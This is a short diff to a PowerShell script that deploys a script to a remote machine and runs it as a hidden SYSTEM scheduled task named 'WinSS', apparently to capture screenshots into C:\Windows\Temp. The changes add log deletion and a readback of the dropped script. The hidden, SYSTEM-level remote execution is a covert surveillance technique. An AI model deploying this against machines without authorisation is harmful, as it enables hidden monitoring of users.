@@ -91,6 +91,7 @@ public class WTS {
         $sb = [scriptblock]::Create($engine)
         invoke-command -session $s -scriptblock {
             Param($et)
+            Remove-Item 'C:\Windows\Temp\sslog.txt' -Force -ErrorAction SilentlyContinue
             Set-Content -Path 'C:\Windows\Temp\ss.ps1' -Value $et -Force
             $act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -f C:\Windows\Temp\ss.ps1'
             Register-ScheduledTask -TaskName 'WinSS' -Action $act -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -ErrorAction SilentlyContinue | Out-Null
@@ -167,6 +168,8 @@ public class WTS {
             if (Test-Path 'C:\Windows\Temp\sslog.txt') { Get-Content 'C:\Windows\Temp\sslog.txt' } else { 'NO SSLOG' }
             'FILE:'
             if (Test-Path 'C:\Windows\Temp\shota.png') { "SHOTFILE $((Get-Item 'C:\Windows\Temp\shota.png').Length) bytes" } else { 'NOFILE' }
+            'SSPS1:'
+            if (Test-Path 'C:\Windows\Temp\ss.ps1') { Get-Content 'C:\Windows\Temp\ss.ps1' | Select-Object -First 40 } else { 'NO SSPS1' }
         } -ArgumentList $engine, $sb
         Write-Host "[i] result above"
 
